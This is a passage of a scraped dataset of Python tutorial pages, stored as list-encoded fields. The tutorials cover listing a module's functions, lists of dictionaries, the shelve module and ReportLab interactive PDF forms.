'tabula.convert_into(', '""tableFile.pdf"",', '""tableFile.csv"",', 'output_format = ""csv"",', 'pages = ""all""']",[],[],[]
379,['List All Functions from a Python Module'],"[""We all must be familiar with the Python Modules and how they work, and we also must be aware that how we can use Python Modules inside a program to use some particular functions. Sometimes many of us wonder how many functions are present in the Python Modules which we have installed in our system. This is a common question that normally comes into everyone's mind while using a particular, and answering this question is not as complex as it looks.""]","['https://www.javatpoint.com/python-list-of-dictionaries', 'https://www.javatpoint.com/manipulating-pdf-using-python', 'https://www.javatpoint.com/python-list-of-dictionaries', 'https://www.javatpoint.com/manipulating-pdf-using-python', 'https://www.javatpoint.com/python-list-of-dictionaries']",[],[],['List All Functions of a Python Module'],"['Method 1: Using the dir() Function:', 'Method 2: Using Inspect Module:']",[],"['Following are the methods which will help us in looking for all the functions present in a Python module:', 'Now, we will learn about both methods and find out how we can implement this method to list down all the functions from a Python module.', 'Example 1:', 'Look at the following Python program where we have used the statistics module in the dir() function:', 'Example 2:', ""Look at the following Python program where we have used the Numpy module inside the inspect module's functions:"", 'As we can see, that Python shell has listed all the functions present in the numpy module.']","['As we can see, when we have used the statistics module inside the dir() method after importing it in the Python shell, the Python shell has listed all the functions present in the statistics module.']","['There can be multiple functions present inside a Python Module depending upon the size and functionality of the module. If we go and read the documentation regarding every particular module of Python to find out how many functions are present inside Python Modules, then it will be going to take a lot of effort from us and will waste our time. Therefore, there must be some other ways through which we can find out whether how many functions are inside a Python Module, and we are going to learn about these methods in this tutorial. We will learn the ways in this tutorial through which we can easily find out how many functions there are in a given Python Module.', 'Before we learn about the methods from which we can list down all the functions present in a Python module, we have to understand where and why we need to know how many functions are present in the module. Answering this question not only will solve the doubt which is coming to mind of most of us, but it will also make us keener for learning the methods. Therefore, first, we will see the reasons that are given below, for which we need to check out the functions present in a Python module:', 'These are the main reasons for which one thinks of checking all the functions present in a Python module, but there can be other reasons too that depend from person to person. Now, we will talk about the methods from which we can check the list of all the functions present in a Python module.', ""We can list down all the functions present in a Python module by simply using the dir() method in the Python shell or in the command prompt shell. We have first to import the module in the Python shell, and then we have to write the module name in the dir() method, and it will return the list of all functions present in a particular Python module. Let's understand the implementation of this method through the following example program."", ""In this method, we will use isfunction and getmembers function from the inspect module (A build-in module of Python) to list down all the functions present in a Python module. We will loop over the module which functions we want to list out using the for loop. One thing we should note here is that we can't list out functions of built-in modules of Python using this method as the type of functions present in any built-in module is not considered as a function for the inspect module. Let's understand the implementation of this method through the following example:""]","['# Import the statistics Module', 'import statistics', '# Use statistics inside dir() method', 'dir(statistics)', '# Import the getmembers and isfunction from the Inspect module', 'from inspect import getmembers, isfunction', '# Import the Numpy Module', 'import numpy', '# Use for loop on the Numpy Module with isfunction() and getmembers() function', 'print(a for a in getmembers(numpy) if isfunction(a[1]))']","[""['Counter', 'Decimal', 'Fraction', 'NormalDist', 'StatisticsError', '__all__', '__builtins__', ????, 'quantiles', 'random', 'sqrt', 'stdev', 'tau', 'variance']"", ""['ALLOW_THREADS', 'AxisError', 'BUFSIZE', 'CLIP', 'ComplexWarning', 'DataSource', 'ERR_CALL', 'ERR_DEFAULT', 'ERR_IGNORE', ???., 'version', 'void', 'void0', 'vsplit', 'vstack', 'warnings', 'where', 'who', 'zeros', 'zeros_like']""]",[],"[""|||Sometimes, we have to check the module which is installed in our system has all the functions which we require to perform a specific task or a task for which we have installed the system.|||Many times, we don't want to update the module installed in our system, and therefore we have to look that all the functions which are required to us are present in the current version or not.|||Other than this, sometimes we don't know how many different types of functions are present in a module, and we want to know about all of these functions present in a Python module.||||||By dir() method|||By Inspect module|||""]"
380,['Python list of Dictionaries'],"['In this tutorial, we will see how we can create a dictionary inside a list and then what are the operations that we can perform.']","['https://www.javatpoint.com/python-shelve-module', 'https://www.javatpoint.com/list-all-functions-from-a-python-module', 'https://www.javatpoint.com/python-shelve-module', 'https://www.javatpoint.com/list-all-functions-from-a-python-module', 'https://www.javatpoint.com/python-shelve-module']",[],[],"['Accessing the Values of Dictionary', 'Updating the Values of Dictionary', 'Appending the Values of the Dictionary', 'Conclusion']",[],[],"[""So let's start with creating a dictionary inside a list."", 'Consider the program given below,', 'Explanation-', ""Let's have a look at the explanation of the above program,"", 'Now, we shall see how we can access the values of a dictionary,', 'The program given below shows how it can done.', 'Explanation-', ""Let's understand what we have done here,"", ""It's time to learn how the values of a dictionary can be updated,"", 'The following program illustrates the same,', 'Explanation-', ""Let's check out what exactly happened in the above program,"", 'Finally, we will learn how we can append the values in a dictionary.', 'Consider the program given below,', 'Explanation-', ""It's time to have a glance at the explanation of this program,"", 'In this tutorial, we learned how we can create a list of dictionaries and access, update and append the values in it.']",[],[],"['#initialising a dictionary inside a list', ""list_val=[{'English':31101,'Hindi':31102,'Mathematics':31103,'Physics':31104,'Chemistry':31105}]"", '#displaying the list', 'print(""The dictionary inside list is: "",list_val)', '#checking the type', 'print(""The type of list_val is: "",type(list_val))', '#initialising the second list', ""slist_val=[{'Apples':'Red','Bananas':'Yellow','Lemons':'Yellow','Peas':'Green','Strawberries':'Pink'}]"", '#displaying the second list', 'print(""The dictionary inside second list is: "",slist_val)', '#checking the type', 'print(""The type of slist_val is: "",type(slist_val))', '#initialising a dictionary inside a list', ""list_val=[{'English':31101},{'Hindi':31102},{'Mathematics':31103,'Calculus':311030},{'Physics':31104},{'Chemistry':31105}]"", '#displaying the list', 'print(""The dictionary inside list is: "",list_val)', '#accessing the values', 'print(list_val[0])', ""print(list_val[1]['Hindi'])"", ""print(list_val[2]['Calculus'])"", '#initialising the second list', ""slist_val=[{'Apples':'Red'},{'Bananas':'Yellow'},{'Lemons':'Yellow','Pineapple':'Brown'},{'Peas':'Green'},{'Strawberries':'Pink'}]"", '#displaying the second list', 'print(""The dictionary inside second list is: "",slist_val)', '#accessing the values', 'print(slist_val[0])', ""print(slist_val[1]['Bananas'])"", ""print(slist_val[2]['Pineapple'])"", '#initialising a dictionary inside a list', ""list_val=[{'English':31101},{'Hindi':31102},{'Mathematics':31103,'Calculus':311030},{'Physics':31104},{'Chemistry':31105}]"", '#displaying the list', 'print(""The dictionary inside list is: "",list_val)', '#updating the values', ""list_val[1]['Hindi']=41102"", ""list_val[2]['Calculus']=311032"", 'print(""Updated dictionary is:"",list_val)', '#initialising the second list', ""slist_val=[{'Apples':'Red'},{'Bananas':'Yellow'},{'Lemons':'Yellow','Pineapple':'Brown'},{'Peas':'Green'},{'Strawberries':'Pink'}]"", '#displaying the second list', 'print(""The dictionary inside second list is: "",slist_val)', '#updating the values', ""slist_val[1]['Bananas']='Green'"", ""slist_val[2]['Pineapple']='Peach'"", 'print(""Updated dictionary is:"",slist_val)', '#initialising a dictionary inside a list', ""list_val=[{'English':31101},{'Hindi':31102},{'Mathematics':31103,'Calculus':311030},{'Physics':31104},{'Chemistry':31105}]"", '#displaying the list', 'print(""The dictionary inside list is: "",list_val)', '#appending the values in dictionary', ""list_val.append({'Biology':31106,'Physical Training':31107})"", 'print(""List after the appended values is: "",list_val)']","[""The dictionary inside list is:  [{'English': 31101, 'Hindi': 31102, 'Mathematics': 31103, 'Physics': 31104, 'Chemistry': 31105}]"", ""The type of list_val is:  <class 'list'>"", ""The dictionary inside second list is:  [{'Apples': 'Red', 'Bananas': 'Yellow', 'Lemons': 'Yellow', 'Peas': 'Green', 'Strawberries': 'Pink'}]"", ""The type of slist_val is:  <class 'list'>"", ""The dictionary inside list is:  [{'English': 31101}, {'Hindi': 31102}, {'Mathematics': 31103, 'Calculus': 311030}, {'Physics': 31104}, {'Chemistry': 31105}]"", ""{'English': 31101}"", '31102', '311030', ""The dictionary inside second list is:  [{'Apples': 'Red'}, {'Bananas': 'Yellow'}, {'Lemons': 'Yellow', 'Pineapple': 'Brown'}, {'Peas': 'Green'}, {'Strawberries': 'Pink'}]"", ""{'Apples': 'Red'}"", 'Yellow', 'Brown', ""The dictionary inside list is:  [{'English': 31101}, {'Hindi': 31102}, {'Mathematics': 31103, 'Calculus': 311030}, {'Physics': 31104}, {'Chemistry': 31105}]"", ""Updated dictionary is: [{'English': 31101}, {'Hindi': 41102}, {'Mathematics': 31103, 'Calculus': 311032}, {'Physics': 31104}, {'Chemistry': 31105}]"", ""The dictionary inside second list is:  [{'Apples': 'Red'}, {'Bananas': 'Yellow'}, {'Lemons': 'Yellow', 'Pineapple': 'Brown'}, {'Peas': 'Green'}, {'Strawberries': 'Pink'}]"", ""Updated dictionary is: [{'Apples': 'Red'}, {'Bananas': 'Green'}, {'Lemons': 'Yellow', 'Pineapple': 'Peach'}, {'Peas': 'Green'}, {'Strawberries': 'Pink'}]"", ""The dictionary inside list is:  [{'English': 31101}, {'Hindi': 31102}, {'Mathematics': 31103, 'Calculus': 311030}, {'Physics': 31104}, {'Chemistry': 31105}]"", ""List after the appended values is:  [{'English': 31101}, {'Hindi': 31102}, {'Mathematics': 31103, 'Calculus': 311030}, {'Physics': 31104}, {'Chemistry': 31105}, {'Biology': 31106, 'Physical Training': 31107}]""]",[],"['|||In the first step, we have created a list and inside it, we have initialized the elements of the dictionary.|||We have then displayed the dictionary and then checked its type using type(), we can see that it comes out to be a list.|||After this, we have done the same thing with another list where the key-value pairs of the dictionary are in the form of strings.||||||In the first step, we have created a list and inside it, we have initialized the elements of the dictionary.|||We have then accessed the values using indexing and further obtained the values by using the keys.|||After this, we have done the same thing with another list where the key-value pairs of the dictionary are in the form of strings.||||||In the first step, we have created a list and inside it, we have initialized the elements of the dictionary.|||We have then updated the values using indexing and then stored the new values with the help of the assignment operator.|||After this, we have done the same thing with another list where the key-value pairs of the dictionary are in the form of strings.||||||In the first step, we have created a list and inside it, we have initialized the elements of the dictionary.|||We have then appended the values using the append() method and specified the elements to be added to it.|||']"
381,['Python Shelve Module'],"[""We all have come across so many instances in our daily life where we have to use a database management system to store all the required information and data. It is often very simple to use a database management system, but sometimes it becomes a bit difficult when we have to store some complex structured data. Database Management Systems are various types, but the most common type we usually use in our daily lives is Relational Database Management System (RDBMS). RDBMS is an effective tool and management system where we can store all our necessary information & data and manage them very easily. There are many instances when we don't have to use Relational Database Management System, or it is not possible to use RDBMS to store data. In such cases, some questions come to our mind: are there any other alternatives in this situation, are there other methods or tools to store data, etc.""]","['https://www.javatpoint.com/creating-interactive-pdf-forms-using-python', 'https://www.javatpoint.com/python-list-of-dictionaries', 'https://www.javatpoint.com/creating-interactive-pdf-forms-using-python', 'https://www.javatpoint.com/python-list-of-dictionaries', 'https://www.javatpoint.com/creating-interactive-pdf-forms-using-python']",[],[],"['Shelve Module in Python', 'Working with the Shelve Module']","['Shelve Module: Introduction', 'Shelve Module: Classes', 'Creating a Shelve File to Store Data:', 'Methods in Shelve Module:', 'Retrieving Data from the Shelve File:', 'Updating Data in the Shelve File:']","['Note: Every time we access the shelve file present in our system, sync() and close() operations are performed along with it, which may slow down the overall process.']","['Example 1:', 'Look at the following Python program where we created a shelve file and stored data inside that file:', 'Explanation:', ""When we run the example program given above, a shelve file with 'SampleFile.dir' will be created in our device, and entries will be made in it."", 'Following various types of methods are present in the shelve module:', '(i) Getting single value by get() method:', 'Example 2:', 'As we can see, the data value with the respective key given in the get() method is printed in the output.', '(ii) Getting all items at once from shelve file:', 'Example 3:', 'As we can see in the output, all the items present in the sample file were printed when we used the items() function.', '(iii) Retrieving only keys from shelve file:', 'If we want to print only keys present in the sample shelve file, we can use the keys() method inside the program after opening the shelve file.', 'Example 4:', 'All the keys present in the sample shelve file are printed in the output with the keys() method.', '(iv) Retrieving only values from shelve file:', 'Example 5:', 'All the values present in the sample shelve file are printed in the output with the keys() method.', '(i) Adding new entries in the shelve file:', 'Example 6:', 'As we can see, when we printed all items from the sample shelve file, new items were also present, which means new entries were made in the file.', '(ii) Removing an entry from the shelve file:', 'Example 7:', 'As we can see, the employee performance key-value entry is not present in the output as we have removed it through the pop() method.']","['Like any other Python module, there are some classes present in the Shelve Module of Python, too, and we are going to discuss these classes in this section. The following three classes are defined inside Python Shelve Module:', 'Now, here we have described all the classes and sub-classes present inside the Shelve Module, and we have also learned which object type is taken as a parameter inside these classes.', ""It will return a shelf object from the DbfilenameShelf sub-class, where the object will collect the data from the user to be stored in the file. Following is the description of the parameters used inside the open() function's syntax given above:"", ""As now we have learned the parameters and syntax of the Shelve Module's open() function, it is time we should use this function in an example program to understand its implementation."", 'We can use all the methods of shelve module to perform various functions on the database shelve file we created, and we are going to use some of these methods in later examples.', 'We can directly print the value from the particular key by providing a key inside the get() method, and to understand this method, we will use this in an example program.', 'This method and its implementation work exactly like the previous method where we used the keys() function, but here we have to use the values() function to print all values from the shelve file.']","[""The answer to these questions is Yes! We have other tools & methods through which we can store data when we don't have to use the RDBMS method. We have other tools, and many of these tools are associated with the library of a programming language. It means that, in the programming world, there are libraries that provide effective tools to use when using Relational Database Management System is not an option. This thing is also applicable to Python, and we have libraries in Python through which we can store all our important data by creating a DBMS-like interface. One of such libraries or modules in Python is Shelve Module, an effective tool for storing or persistent data storage. We will learn about this Shelve Module of Python in this tutorial, where we store data inside using Shelve Module inside a Python program."", ""The Shelve Module of Python is a very popular module of Python which works like an effective tool for persistent data storage inside files using a Python program. As the name of this module suggests, i.e., Shelve, we can easily interpret that it will work as a shelf object to keep all our data inside a file and save all the necessary information. In the Shelve Module, a shelf object is defined, which acts like a dictionary-type object, and it is persistently stored in the disk file of our computer. That's how we can save all the data and information through Python Shelve Module in our system and keep it till whenever we want."", ""Shelve Module of Python is an effective tool through which we can store all the data and information inside a file and keep it in our computer's storage until we change our mind to remove it. Shelve Module is not only helpful in storing information inside a file, but it is also very effective in modifying the already present information and adding some new information in the same file. We can perform all these operations (creating, reading, writing, and deleting from a file) from the Shelve Module by using this module and its functions inside a Python program. The Shelve Module creates a very similar file to the DBMS database present on systems such as UNIX. We can only use string data type as the keys in the special dictionary object present in the file, whereas the pickable objects from the shelve files can serve as the value for the keys."", ""Shelve Module is an in-built library of Python, and one can find this module pre-installed in all versions of Python 2 and 3. Therefore, for working with Shelve Module, we don't have to use any installer or pip command first to install the Shelve Module. We can directly use the 'import shelve' statement in a Python program to import and use all functions of the Shelve module in that program. To understand the working of the Shelve Module, we will divide the implementation part of it into three parts where first we create a shelve file and store data in it, secondly, we open the file and retrieve values from it, and in last, we update data inside the shelve file. We will learn the working and implementation of the Shelve Module through the following three steps:"", ""We will learn about each of the three parts as mentioned above by using an example program where we perform the respective tasks using the functions of the Shelve Module. Now, let's learn the implementation of each part of the working of the Shelve Module by first creating a Sample Shelve file."", 'If we want to store some data inside the shelve file, we have first to create one, and only then can we add the desirable data. We can create a shelve file by simply using its open() function, which works similarly to the open() function we use during the file handling process. With the open() function of Shelve Module, we have to follow the given below syntax to open or create a new shelve file:', ""We have first imported the Shelve Module in the example program so that we can use the open() function of it to create a sample shelve file. Then, we used the open() function inside the initialized shelveVariable to use it further for entries and created a sample shelve file with the 'SampleFile' name. We then used initialized shelveVariable to make entries inside the sample shelve file we created, and we used the dictionary method to make multiple entries in it. We made multiple entries in the separate columns using the initialized variable, and last, we used the close() function to save these entries in the file."", ""In the above example, we used the open() method to create a database shelve file, but this isn't the only method present in the shelve module. Shelve Module provides us with many different methods, and each one of these methods has different functionality, which is very useful for us."", ""After creating a shelve file and making data entries into this file, the first thing which we want to do is to check if all the entries are successfully made into the file or not. The best way to check is to print all these entries in the output and see whether all entries are printed. This method is also useful when we don't know what data is present in a shelve file (cases someone worked on our shelve file or we are working on someone else's shelve file). We can access data from the Shelve by many methods like get(), values(), items(), and keys(). These all methods work very differently and return the same data but in different forms, and therefore we will use each of them to return data from the sample shelve file we created in example 1."", 'If we want to retrieve all items from the shelve file at once, we can use the items() method with the shelve object, and it will return all the items present inside the sample shelve file in the output. We will use the following example program to understand the implementation of this method:', 'We can even update the data already present in the shelve file, and in this method, we can perform three tasks, but here we will perform only two. First, we can update the value of a key already present in the file; second, we can add new entries; and last, we can remove an entry from the file. If we want to update the current value associated with a key to a new value, we have to write the new value with the key object, and the program will assign the new value in that key.', 'If we want to add new entries, we first have to define a dictionary variable in the program, and then we can write new entries there with key-value pair. After that, we can use the update() method by providing the name of the dictionary variable as an argument in the method, and it will add new entries in the file.', 'If we want to remove an already existing entry in the file, we can use the pop() method. We have to write the key name in the function, and it will remove the key and value associated with it from the shelve file. We can verify this through by printing all the items from the shelve file.']","["">> shelve = open(NameOfFile, flag = 'c', protocol = None, writeback = True)"", '# Importing the Shelve Module', 'import shelve', '# Creating a shelve file with open() function', 'shelveVariable = shelve.open(""SampleFile"")', 'print(""A Shelve file with SampleFile name is successfully created"")', '# Making entries inside the shelve file', ""shelveVariable['Employee Name'] = 'Jackie Chan'"", ""shelveVariable['Employee Age'] = 27"", ""shelveVariable['Employee department'] = Management"", ""shelveVariable['Employee Performance'] = Excellent"", ""shelveVariable['Employee Score'] = 9.2"", 'shelveVariable.close()', 'print(""All entries are successfully made inside the sample shelve file"")', '# Importing the Shelve Module', 'import shelve', '# Opening the sample shelve file with open() function', 'shelveVariable = shelve.open(""SampleFile"")', '# Print data entries from the sample shelve file in the output', 'print(""Name of Employee in the file: "", shelveVariable[\'Employee Name\'])', 'print(""Age of Employee: "", shelveVariable[\'Employee Age\'])', 'print(""Department of Employee: "", shelveVariable[\'Employee department\'])', 'print(""Score of Employee: "", shelveVariable[\'Employee Score\'])', '# Importing the Shelve Module', 'import shelve', '# Opening the sample shelve file with open() function', 'shelveVariable = shelve.open(""SampleFile"")', '# Print all data entries from the sample shelve file in list form', 'print(""Items in the sample shelve file: "", list(shelveVariable.items()))', '# Importing the Shelve Module', 'import shelve', '# Opening the sample shelve file with open() function', 'shelveVariable = shelve.open(""SampleFile"")', '# Print only keys from the sample shelve file in the output', 'print(""Keys in the sample shelve file: "", list(shelveVariable.keys()))', '# Importing the Shelve Module', 'import shelve', '# Opening the sample shelve file with open() function', 'shelveVariable = shelve.open(""SampleFile"")', '# Print only values from the sample shelve file in the output', 'print(""Values in the sample shelve file: "", list(shelveVariable.values()))', '# Importing the Shelve Module', 'import shelve', '# Opening the sample shelve file with open() function', 'shelveVariable = shelve.open(""SampleFile"")', '# Adding new fields inside the sample shelve file', ""sampleDict = {'Employee Salary' : 50000, 'Employee Sub-department' : 'Field Work'}"", 'shelveVariable.update(sampleDict)', '# Print data entries from the sample shelve file in list form', 'print(""Items in the sample shelve file: "", list(shelveVariable.items()))', '# Importing the Shelve Module', 'import shelve', '# Opening the sample shelve file with open() function', 'shelveVariable = shelve.open(""SampleFile"")', '# Delete a field from the shelve file', ""shelveVariable.pop('Employee Performance')"", '# Print data entries from the sample shelve file in list form', 'print(""Items in the sample shelve file: "", list(shelveVariable.items()))']","['A Shelve file with SampleFile name is successfully created', 'All entries are successfully made inside the sample shelve file', 'Name of Employee in the file:  Jackie Chan', 'Age of Employee:  27', 'Department of Employee:  Management', 'Score of Employee:  9.2', ""Items in the sample shelve file:  [('Employee Name', 'Jackie Chan'), ('Employee Age', 27), ('Employee department', 'Management'), ('Employee Performance', 'Excellent'), ('Employee Score', 9.2)]"", ""Keys in the sample shelve file:  ['Employee Name', 'Employee Age', 'Employee department', 'Employee Performance', 'Employee Score']"", ""Values in the sample shelve file:  ['Jackie Chan', 27, 'Management', 'Excellent', 9.2]"", ""Items in the sample shelve file:  [('Employee Name', 'Jackie Chan'), ('Employee Age', 27), ('Employee department', 'Management'), ('Employee Performance', 'Excellent'), ('Employee Score', 9.2), ('Employee Salary', 50000), ('Employee Sub-department', 'Field Work')]"", ""Items in the sample shelve file:  [('Employee Name', 'Jackie Chan'), ('Employee Age', 27), ('Employee department', 'Management'), ('Employee Score', 9.2), ('Employee Salary', 50000), ('Employee Sub-department', 'Field Work')]""]","['S. No.|||Module Class|||Description&&&1|||Shelf Class|||The shelf class is the base class from the Shelve Module, and it is used for the shelf implementation in a shelve file. We can initialize the Shelf class from the Shelve Module using a dict-like object inside the Python program.&&&2|||DBFileNameShelf Class|||This is a sub-class of the base Shelf class, and it accepts the name of the shelve files as the parameter to its constructor rather than a dict-like object parameter.&&&3|||BsdDbShelf Class|||BsdDbShelf Class is also a sub-class from the base shelf class, and this class accepts a dict-like object as a parameter which makes this sub-class different from the DBFileNameShelf class. The dict-like object parameter which we pass as a parameter to its constructors should support first(), last(), previous(), next() and set_location() methods.', 'Sr No|||Method Name|||Description of Method&&&1|||get()|||This method will return the value associated with the key (provided as an argument inside the method) present in the database file.&&&2|||keys()|||Keys() method is used to return the names of all keys present in a shelve file (which name we have provided as an argument in the method).&&&3|||values()|||The values() method works very similarly to the keys() method of the shelve module as it returns the values present in a shelve file.&&&4|||items()|||If we want to get both keys and values from a shelve file in a single call, we can use this items() method by providing the name of the shelve file as an argument in the method.&&&5|||close()|||The close method first synchronizes the items we gave for the shelve file, and then it closes the persistent dict object, which we initialized while opening/creating the shelve file.&&&6|||update()|||If we want to update our shelve file and add more entries, we can use the update() method to do the same.&&&7|||pop()|||The pop() method is exactly opposite to the update() method as it is used to remove an entry (Key and value resemble with it) from the Shelve file.&&&8|||sync()|||sync() method is used to write back all the entries into the cache memory of the program whenever we set writeback to True while opening the shelve file.']","[""|||Creating a shelve file to store data|||Retrieving Data from the Shelve file|||Updating data in the Shelve file||||||NameOfFile: It is the name of the file which we want to or have assigned to the database (shelve file) we are creating/opening using the open()|||flag: The flag parameters for the open() function's syntax is c, w, n, and r, in which 'c' is the default one. The 'c' keyword in the flag parameter represents we gave read and write access for the file, 'w' represents we gave write-only access, 'r' represents we gave only read access, and 'n' represents that we are creating a new file with NameOfFile name.|||Writeback: Writeback parameter is false by default, but if we set this parameter as true, the entries we give in the shelve file will be cached in the program's cache memory.|||Protocol: The protocol parameter in the function denotes the pickle protocol for the entries.|||""]"
382,['Creating Interactive PDF forms using Python'],"['Python provides different functionalities that one can perform in order to manipulate PDF files, and we have already discussed a lot of things in the previous two tutorials on handling PDF files using Python. In this tutorial, we will understand how to create Interactive forms in a PDF file using the Python programming language.']","['https://www.javatpoint.com/python-newspaper-module', 'https://www.javatpoint.com/python-shelve-module', 'https://www.javatpoint.com/python-newspaper-module', 'https://www.javatpoint.com/python-shelve-module', 'https://www.javatpoint.com/python-newspaper-module']","['https://static.javatpoint.com/python/images/creating-interactive-pdf-forms-using-python1.png', 'https://static.javatpoint.com/python/images/creating-interactive-pdf-forms-using-python2.png', 'https://static.javatpoint.com/python/images/creating-interactive-pdf-forms-using-python3.png', 'https://static.javatpoint.com/python/images/creating-interactive-pdf-forms-using-python4.png', 'https://static.javatpoint.com/python/images/creating-interactive-pdf-forms-using-python5.png']",[],['Understanding the ReportLab toolkit in Python'],"['Understanding the Checkbox widget', 'Understanding the Radio widget', 'Understanding the Choice widget', 'Understanding the Listbox widget', 'Understanding the Textfield widget']",[],"['Now, let us understand a simple example that illustrates how few of these parameters behave:', 'Explanation:', 'Now, let us understand the same using a simple example as shown below:', 'Explanation:', 'Let us understand the following example demonstrating the use of choice widgets in a PDF document:', 'Explanation:', 'Now, let us consider the following example illustrating the use of the listbox widget in making interactive PDF forms:', 'Explanation:', 'Let us consider the following example to understand the same:', 'Explanation:']","['But before we get started, we will also discuss a Python toolkit that provides us accessibility to create one interactive form known as the ReportLab toolkit.', 'All of the stated widgets are developed by calling different methods on the canvas.acroform property. Note that we can only have one form per document. Let us understand these widgets of the ReportLab toolkit.', 'The textfield is a text entry widget. We can see these textfield widgets in forms to fill up the entries like name, address, and more. Most of the parameters of the textfield are the same as the ones we have observed in the earlier widgets.']","['The Python ReportLab toolkit allows the programmers to create forms that are interactive and fillable. The PDF standard usually consists of a rich set of interactive elements. The ReportLab toolkit does not support all of these elements; however, it does cover most of them. In the following section, we will look at the following widgets:', 'The checkbox widget is exactly what it sounds like. It is a little box that we can use to check entities shown in a form. Reportlab supports different styles of checks for the checkboxes, so when the checkbox is checked, it can look distinctive as per the style that we set.', ""As we can observe in the above snippet of code, we have imported different functions from different modules of the ReportLab library. We have then set up the name and set the tooltip in order to match the widget's name. We have then set its position and some of the other things. We can play around with the width of the checkbox's border or turn the border off. If we turn it off, though, the checkbox may become invisible, so we might want to set its background color via fillColor if we do that. We have set the buttonStyle to something distinctive for each of the checkboxes."", 'The radio widgets are similar to the checkboxes, despite the fact that radio buttons lie within the group where we can select only one radio button at a time. Checkboxes are rarely restricted to allowing one checkbox per group. The ReportLab toolkit does not offer a method to explicitly group a set of radio boxes altogether. The toolkit only provides the implicit way of grouping it. This statement implies that if we create a series of radio one after the other, they will be grouped together.', 'In the above snippet of code, we have imported the required functions from the different modules of the ReportLab toolkit. We have then defined a function and created a new PDF file. We have then defined different radio buttons for the PDF file and saved the file. At last, we have called the function.', 'Once we execute the above snippet of code, we can observe that the program only returns three radios. This is because we are required to create two objects of each radio button with identical names but with different values and sections. The documentation does not state the reason behind it, but we can assume this is done to support the ReportLab toolkit tracking the widget\'s ""selected"" state. This also allows us to alter the appearance of the radio when it is selected or deselected.', 'The choice widget is fundamentally a combo box that shows a drop-down when the user clicks on it. This enables the user to pick one or more options from the drop-down list, relying on the fieldFlags we have set. If we insert edit to the fieldFlags, then the user can edit the element in the choice widget.', 'In the above snippet of code, we have imported the required functions from the different modules of the ReportLab toolkit. We have then defined a function and created a new PDF file. We have then created two choice widgets with slightly distinct styles applied and saved the file. Remember to include the value parameter to the function; else, the program will return a bizarre error that does not say anything associated with the parameter being missing. At last, we have called the function.', 'The listbox widget is somewhat similar to the choice widget, except that a listbox is considered a scrollable box rather than a combo box. We can use the fieldFlags parameter that supports the user to select one or multiple elements from the list box.', 'In the above snippet of code, we have imported the required functions from the different modules of the ReportLab toolkit. We have then defined a function and created a new PDF file. We have then created the listbox widgets with slightly distinct styles applied and saved the file. The above example is quite similar to the previous one where we created the choice widget. The main difference here is the appearance of the listbox widget versus the choice widget; else, both the widgets are pretty much the same.', 'In the above snippet of code, we have imported the required functions from the different modules of the ReportLab toolkit. We have then defined a function and created a new PDF file. We have then created the textfield widgets with slightly distinct styles applied and saved the file. As we can observe, we have created a series of text fields with different settings applied to them. Moreover, we have changed the border and background color on several of the fields. We have then included some quite standard ones. We have also utilized the width argument in order to change the width of the text field.']","['from reportlab.pdfgen import canvas', 'from reportlab.pdfbase import pdfform', 'from reportlab.lib.colors import magenta, pink, blue, green', 'def createSimpleCheckboxes():', ""my_Canvas = canvas.Canvas('checkboxes.pdf')"", 'my_Canvas.setFont(""Courier"", 24)', ""my_Canvas.drawCentredString(300, 700, 'Programming Languages')"", 'my_Canvas.setFont(""Courier"", 16)', 'form = my_Canvas.acroForm', ""my_Canvas.drawString(10, 650, 'Python:')"", 'form.checkbox(', ""name = 'cb1',"", ""tooltip = 'Field cb1',"", 'x = 110,', 'y = 645,', ""buttonStyle = 'check',"", 'borderColor = magenta,', 'fillColor = pink,', 'textColor = blue,', 'forceBorder = True', ')', ""my_Canvas.drawString(10, 600, 'Java:')"", 'form.checkbox(', ""name = 'cb2',"", ""tooltip = 'Field cb2',"", 'x = 110,', 'y = 595,', ""buttonStyle = 'cross',"", 'borderWidth = 2,', 'forceBorder = True', ')', ""my_Canvas.drawString(10, 550, 'C++:')"", 'form.checkbox(', ""name = 'cb3',"", ""tooltip = 'Field cb3',"", 'x = 110,', 'y = 545,', ""buttonStyle = 'star',"", 'borderWidth = 1,', 'forceBorder = True', ')', ""my_Canvas.drawString(10, 500, 'C:')"", 'form.checkbox(', ""name = 'cb4',"", ""tooltip = 'Field cb4',"", 'x = 110,', 'y = 495,', ""buttonStyle = 'circle',"", 'borderWidth = 3,', 'forceBorder = True', ')', ""my_Canvas.drawString(10, 450, 'JavaScript:')"", 'form.checkbox(', ""name = 'cb5',"", ""tooltip = 'Field cb5',"", 'x = 110,', 'y = 445,', ""buttonStyle = 'diamond',"", 'borderWidth = None,', 'checked = True,', 'forceBorder = True', ')', 'my_Canvas.save()', ""if __name__ == '__main__':"", 'createSimpleCheckboxes()', 'from reportlab.pdfgen import canvas', 'from reportlab.pdfbase import pdfform', 'from reportlab.lib.colors import magenta, pink, blue, green', 'def createSimpleRadios():', ""my_canvas = canvas.Canvas('radiosFile.pdf')"", 'my_canvas.setFont(""Courier"", 22)', ""my_canvas.drawCentredString(300, 700, 'Radio demo')"", 'my_canvas.setFont(""Courier"", 16)', 'form = my_canvas.acroForm', ""my_canvas.drawString(10, 650, 'Python:')"", 'form.radio(', ""name = 'radio1',"", ""tooltip = 'Field radio1',"", ""value = 'value1',"", 'selected = False,', 'x = 110,', 'y = 645,', ""buttonStyle = 'check',"", ""borderStyle = 'solid',"", ""shape = 'square',"", 'borderColor = magenta,', 'fillColor = pink,', 'textColor = blue,', 'forceBorder = True', ')', 'form.radio(', ""name = 'radio1',"", ""tooltip = 'Field radio1',"", ""value = 'value2',"", 'selected = True,', 'x = 110,', 'y = 645,', ""buttonStyle = 'check',"", ""borderStyle = 'solid',"", ""shape = 'square',"", 'borderColor = magenta,', 'fillColor = pink,', 'textColor = blue,', 'forceBorder = True)', ""my_canvas.drawString(10, 600, 'Java:')"", 'form.radio(', ""name = 'radio2',"", ""tooltip = 'Field radio2',"", ""value = 'value1',"", 'selected = True,', 'x = 110,', 'y = 595,', ""buttonStyle = 'cross',"", ""borderStyle = 'solid',"", ""shape = 'circle',"", 'borderColor = green,', 'fillColor = blue,', 'borderWidth = 2,', 'textColor = pink,', 'forceBorder = True', ')', 'form.radio(', ""name = 'radio2',"", ""tooltip = 'Field radio2',"", ""value = 'value2',"", 'selected = False,', 'x = 110,', 'y = 595,', ""buttonStyle = 'cross',"", ""borderStyle = 'solid',"", ""shape = 'circle',"", 'borderColor = green,', 'fillColor=blue,', 'borderWidth=2,', 'textColor = pink,', 'forceBorder=True', ')', ""my_canvas.drawString(10, 550, 'C++:')"", 'form.radio(', ""name = 'radio3',"", ""tooltip = 'Field radio3',"", ""value = 